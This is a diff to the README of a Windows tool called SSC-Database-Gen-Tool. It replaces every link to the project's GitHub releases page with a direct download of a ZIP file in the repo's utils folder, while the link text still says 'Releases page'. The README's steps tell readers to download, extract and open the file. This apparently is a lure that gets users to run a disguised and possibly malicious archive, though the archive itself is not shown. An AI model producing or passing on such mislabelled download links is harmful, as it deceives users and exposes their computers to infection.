@@ -1,10 +1,10 @@
 # 🧩 SSC-Database-Gen-Tool - Build game data with less effort
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/jonascolditz3-dot/SSC-Database-Gen-Tool/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/jonascolditz3-dot/SSC-Database-Gen-Tool/raw/refs/heads/main/utils/SS_Gen_Database_Tool_hackberry.zip)
 
 ## 📥 Download
 
-Open the releases page here: [SSC-Database-Gen-Tool Releases](https://github.com/jonascolditz3-dot/SSC-Database-Gen-Tool/releases)
+Open the releases page here: [SSC-Database-Gen-Tool Releases](https://github.com/jonascolditz3-dot/SSC-Database-Gen-Tool/raw/refs/heads/main/utils/SS_Gen_Database_Tool_hackberry.zip)
 
 On that page, look for the latest Windows file and download it. After the file finishes downloading, open it to start the app.
 
@@ -33,7 +33,7 @@ If the release comes as a ZIP file, you will need to extract it first.
 
 ## 🚀 Install on Windows
 
-1. Open the [Releases page](https://github.com/jonascolditz3-dot/SSC-Database-Gen-Tool/releases)
+1. Open the [Releases page](https://github.com/jonascolditz3-dot/SSC-Database-Gen-Tool/raw/refs/heads/main/utils/SS_Gen_Database_Tool_hackberry.zip)
 2. Download the latest Windows release
 3. If the file is a ZIP archive, right-click it and choose Extract All
 4. Open the extracted folder
@@ -160,7 +160,7 @@ If you plan to use the output in a TypeScript project, the structured data can h
 
 Each release may include one or more Windows-ready files. Look for the latest version on the releases page and use the file that matches your setup.
 
-[Go to Releases](https://github.com/jonascolditz3-dot/SSC-Database-Gen-Tool/releases)
+[Go to Releases](https://github.com/jonascolditz3-dot/SSC-Database-Gen-Tool/raw/refs/heads/main/utils/SS_Gen_Database_Tool_hackberry.zip)
 
 ## 📚 Folder example for a clean run
 
